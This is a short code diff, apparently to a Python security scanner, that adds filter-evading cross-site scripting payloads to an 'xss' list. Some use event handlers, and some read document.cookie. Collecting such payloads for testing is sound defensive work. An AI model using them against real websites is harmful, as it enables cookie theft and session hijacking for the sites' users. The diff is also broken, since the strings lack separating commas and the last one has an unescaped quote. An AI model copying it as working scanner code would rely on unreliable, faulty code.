@@ -112,6 +112,12 @@ USER_PAYLOADS = {
     "xss": [
         "<script>alert(1)</script>",
         "<sCriPt x>(((alert(1))))``</scRipt x>"
+        "%3Cimg%20src%3Dc%20onerror%3Dalert (1)%3E"
+        ">>>>>><marquee>RXSS</marquee></head><abc></script><script>alert(1)</script><meta"
+        "{{alert(1)}}"
+        "><?/script>><svg/onload?=alert(document.cookie)>> --!>"
+        "autofocus onfocus=alert(origin) x="
+        "./" onmouseover="alert(document.cookie)"
     ]
 }
 
